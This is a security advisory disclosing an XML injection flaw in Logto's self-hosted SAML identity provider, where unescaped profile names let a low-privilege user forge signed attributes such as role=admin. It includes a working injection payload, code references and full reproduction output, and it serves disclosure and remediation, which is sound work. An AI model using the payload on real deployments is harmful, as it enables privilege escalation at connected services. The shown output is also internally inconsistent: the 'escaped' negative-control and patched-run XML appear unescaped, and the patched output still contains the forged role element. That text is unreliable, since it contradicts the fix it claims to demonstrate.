repo.description:
## Summary

Logto's self-hosted SAML application IdP builds the to-be-signed `<samlp:Response>` / `<saml:Assertion>` by string-substituting a user's own profile attributes (`name`, `email`, and any custom attribute-mapping values) into **element-text** placeholders of a SAML XML template, using the `samlify` library pinned at `2.10.0` in `packages/core`. The `samlify` version Logto pins XML-escapes a substituted value only when the placeholder sits in **attribute position** (i.e. is preceded by a `"`); placeholders in **element-text position** such as `<saml:AttributeValue>{attr}</saml:AttributeValue>` and `<saml:NameID …>{NameID}</saml:NameID>` are inserted **raw**, with no XML escaping.

Because an authenticated, low-privilege Logto end user fully controls their own profile `name`/`email`, they can set that value to markup that closes the current `<saml:AttributeValue>`/`<saml:Attribute>` and opens an attacker-defined element, e.g.:

```
Mallory</saml:AttributeValue></saml:Attribute><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute><saml:Attribute Name="x"><saml:AttributeValue>
```

Logto's IdP then signs the resulting assertion. The injected `<saml:Attribute Name="role">admin</saml:Attribute>` element lands **inside the signed region**, so a connected Service Provider that validates the IdP signature (the normal SAML trust model) accepts the forged attribute as authentic. The result is cross-application privilege escalation: a low-privilege user grants themselves arbitrary SAML attributes (e.g. `role=admin`, group membership) at any SP that authorizes on SAML attributes.

## Severity

High. An authenticated low-privilege Logto user escalates to arbitrary roles/groups at relying Service Providers, inside a cryptographically valid, IdP-signed SAML assertion. There is no SP-side mitigation, because the injected element is covered by a valid signature, so the SP cannot distinguish it from a legitimately-issued attribute.

## Affected component / version

- `packages/core` SAML application IdP (`SamlApplication`), via `samlify@2.10.0`.
- Live `master` (verified 2026-05-29): `packages/core/package.json` pins `"samlify": "2.10.0"`, and `packages/connectors/connector-saml/package.json` pins `"samlify": "2.10.0"`. Both are in the vulnerable range (`< 2.13.0`).

## Vulnerable code (file:line)

Template (element-text placeholders, no escaping) - `packages/core/src/saml-application/SamlApplication/consts.ts`:

```
// line 12 - NameID in element-text position
<saml:NameID Format="{NameIDFormat}">{NameID}</saml:NameID>
// line 27 - the AttributeStatement placeholder (each attribute value is element-text)
{AttributeStatement}
// lines 45-49 - user-controlled fallback attribute claims
export const fallbackAttributes: Array<keyof IdTokenProfileStandardClaims> = [
  'sub',
  'email',
  'name',
];
```

Sink + user value flow - `packages/core/src/saml-application/SamlApplication/index.ts`:

```
// lines 516-523 - raw user profile values become tag values, no XML escaping
Object.fromEntries(
  fallbackAttributes.map((attribute) => [
    generateSamlAttributeTag(attribute),
    (typeof userInfo[attribute] === 'boolean'
      ? String(userInfo[attribute])
      : userInfo[attribute]) ?? null,
  ])
);
// line 465 - the vulnerable substitution call (raw element-text insertion)
const context = saml.SamlLib.replaceTagsByValue(template, tagValues);
```

The `userInfo` object is the result of Logto's own OIDC `userinfo` response for the signing-in end user (`getUserInfo`, `index.ts:347`), whose `name`/`email` are user-editable profile fields. The request-reachable IdP login-response path that emits the signed `context` is `createSamlResponse` → `this.idp.createLoginResponse(...)` (`index.ts:204`), reached by the SP-initiated SSO route `/saml/:id/authn` and the OIDC callback `/saml-applications/:id/callback` (`packages/core/src/routes/saml-application/anonymous.ts`).

## Reachable attack scenario (how the value reaches the sink)

1. A low-privilege user self-registers (or is provisioned) in Logto and edits their own profile `name` to the injection payload above. (`name` is part of the `profile` scope, which the SAML app requests by default - see `getScopesFromAttributeMapping`, `index.ts:376`.)
2. The user performs a normal SP-initiated (or IdP-initiated) SAML SSO to any application configured as a Logto SAML app.
3. Logto's IdP fetches the user's `userInfo`, substitutes the raw `name` into the element-text `<saml:AttributeValue>` slot via `replaceTagsByValue`, and **signs** the assertion.
4. The SP validates the signature (valid) and reads the injected `<saml:Attribute Name="role">admin</saml:Attribute>` as a trusted claim → privilege escalation.

## Root cause

The `samlify` version Logto pins escapes only attribute-position placeholders, leaving element-text placeholders raw, and Logto's template (`consts.ts`) places user-controlled attribute values and the NameID in element-text position while `buildSamlAttributesTagValues` (`index.ts`) passes the raw profile values into `replaceTagsByValue` without performing its own XML escaping. The signing step then sweeps the injected markup into the signed region.

## Proof of concept

The complete verbatim deployed-app transcript is in the End-to-end reproduction section below. In summary: against a real `svhd/logto:latest` deployment (which ships `samlify@2.10.0`), a low-privilege user whose profile `name` is set to the 94-character payload below performs a normal SP-initiated SAML SSO; the IdP emits a **signed** assertion containing a forged `<saml:Attribute Name="role">admin</saml:Attribute>` element, and an independent SP validates the signature and reads `role=admin` as a trusted claim.

Injection payload set as the low-privilege user's profile `name` (94 chars, well within Logto's `varchar(128)` limit):

```
x</saml:AttributeValue></saml:Attribute><saml:Attribute Name="role"><saml:AttributeValue>admin
```

After this value the per-attribute template emits its closing `</saml:AttributeValue></saml:Attribute>`, which closes the forged `role` element opened by the payload - yielding well-formed XML that survives the XML-signing DOM round-trip intact.

## End-to-end reproduction (against the deployed app)

Setup: official `docker compose` deployment of Logto (`svhd/logto:latest`, `samlify@2.10.0` confirmed in the running container), a SAML application created via the real Management API pointing at an independent SP verifier (`samlify@2.13.1`, SP-side, which validates the IdP signature), and a low-privilege user whose profile `name` is the payload above. The SP-initiated SSO is driven through Logto's real sign-in UI with a headless browser; the IdP auto-submits the signed assertion to the SP ACS, where the SP validates the signature and dumps the result.

Confirm the running container ships the vulnerable pin:

```
$ docker exec logto-app sh -c 'cat .../node_modules/samlify/package.json | grep version'
  "version": "2.10.0",
```

VULNERABLE build (samlify 2.10.0) - SP verifier stdout (signature validates, forged role attribute injected):

```
===== SIGNATURE_VALIDATED =====
parseLoginResponse() returned WITHOUT throwing => IdP signature is VALID.
===== EXTRACTED ATTRIBUTES (post-signature-validation) =====
{
  "sub": "f85qr8nuextm",
  "email": [],
  "name": "x",
  "role": "admin"
}
===== EXTRACTED NameID =====
f85qr8nuextm
===== RAW SIGNED ASSERTION XML (decoded SAMLResponse) =====
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="ID_5uke7y72x2mlmn3y0ggiv" Version="2.0" IssueInstant="2026-05-29T08:15:15.738Z" Destination="http://localhost:8088/acs" InResponseTo="_321ca387-ac9f-4c4d-99ff-b3b9041a37c3">
  <saml:Issuer>http://localhost:3001/saml/6b8pkae91jc8owfxfy02m</saml:Issuer><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#ID_5uke7y72x2mlmn3y0ggiv"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>ZeikZ2FRM9BZum4YWiQAamFq6/fD9/lR7OrXSLs5zFs=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>CmmEus2WthBKS1IEHVcYp9JUp+e2qKeZ1e6vrIdG9Pu...</ds:SignatureValue><ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIEzjCCAragAwIBAgIQ...</ds:X509Certificate></ds:X509Data></ds:KeyInfo></ds:Signature>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="ID_07jsmhj3l9rjxulkgy0fr" Version="2.0" IssueInstant="2026-05-29T08:15:15.738Z" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Issuer>http://localhost:3001/saml/6b8pkae91jc8owfxfy02m</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">f85qr8nuextm</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2026-05-29T08:25:15.738Z" Recipient="http://localhost:8088/acs" InResponseTo="_321ca387-ac9f-4c4d-99ff-b3b9041a37c3"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-05-29T08:15:15.738Z" NotOnOrAfter="2026-05-29T08:25:15.738Z">
      <saml:AudienceRestriction>
        <saml:Audience>http://localhost:8088/metadata</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2026-05-29T08:15:15.738Z" SessionNotOnOrAfter="2026-05-29T09:15:12.605Z" SessionIndex="nqwh5wg7wlryn5vpj7zo4yvocrv4qic2">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement><saml:Attribute Name="sub" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">f85qr8nuextm</saml:AttributeValue></saml:Attribute><saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string"/></saml:Attribute><saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">x</saml:AttributeValue></saml:Attribute><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

The crux: the `name` attribute now carries only `x`, and a brand-new `<saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>` element (which the IdP configuration never defined) sits inside the assertion. The `ds:Reference URI="#ID_5uke7y72..."` signs the whole `<samlp:Response>`, so the injected element is inside the signed region; the SP's `parseLoginResponse()` validated the signature and returned `role=admin`.

Negative control (same vulnerable build, benign profile `name` = `a<b & c`) - the value is XML-escaped inside a single AttributeValue and NO new element is created; the SP extracts only `sub`/`email`/`name`:

```
===== EXTRACTED ATTRIBUTES (post-signature-validation) =====
{
  "sub": "f85qr8nuextm",
  "email": [],
  "name": "a<b & c"
}
... raw name attribute in the signed assertion ...
<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">a<b & c</saml:AttributeValue></saml:Attribute>
```

Patched re-run (same deployment with `samlify` swapped to `2.13.0` and the app restarted; identical injection payload) - the payload is XML-escaped and stays inside the `name` AttributeValue; there is NO `role` key in the extracted attributes:

```
===== EXTRACTED ATTRIBUTES (post-signature-validation) =====
{
  "sub": "f85qr8nuextm",
  "email": [],
  "name": "x</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"role\"><saml:AttributeValue>admin"
}
... raw name attribute in the signed assertion (fully escaped, no breakout) ...
<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"><saml:AttributeValue xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="xs:string">x</saml:AttributeValue></saml:Attribute><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
```

On the patched build the entire payload is inert text inside the single `name` attribute (`<`, `>`, `"` entities), so no forged `role` attribute exists and the privilege escalation is closed.

## Impact

A low-privilege, authenticated Logto user forges arbitrary SAML attributes (role, group, entitlements) inside a valid IdP-signed assertion, escalating privileges at every relying Service Provider that authorizes on SAML attributes. The `{NameID}` placeholder sits in the same unescaped element-text position and should be treated identically by the fix, but it is not reachable in practice today: every supported NameID source is system-controlled or validated - `EmailAddress` uses the user's verified, format-validated email; `Persistent`/`Unspecified` use the system-generated user ID; `Transient` uses a random ID. The exploitable vector is therefore the user-editable attribute values (`name` and custom-mapped attributes).

## Suggested fix

- Upgrade the pinned `samlify` to `>= 2.13.0` in `packages/core/package.json` (and `packages/connectors/connector-saml/package.json`), which XML-escapes element-text placeholders as well as attribute-position ones.
- Defense-in-depth: XML-escape every user-controlled attribute value and NameID before template substitution, independent of the library version, and add a regression test asserting that an injected `</saml:AttributeValue>…<saml:Attribute>` profile value appears escaped (no new `<saml:Attribute>` element) in the generated assertion.

## Planned fix

The fix will be developed in this advisory's temporary private fork: bump `samlify` to `>= 2.13.0` in `packages/core/package.json` and `packages/connectors/connector-saml/package.json` (which XML-escapes element-text placeholders), add a version-independent defense-in-depth pass that XML-escapes every user-controlled attribute value and the NameID before template substitution, and add a regression test asserting that an injected attribute value is XML-escaped and cannot create a forged `<saml:Attribute>` element in the generated assertion.

## Credit

tonghuaroot
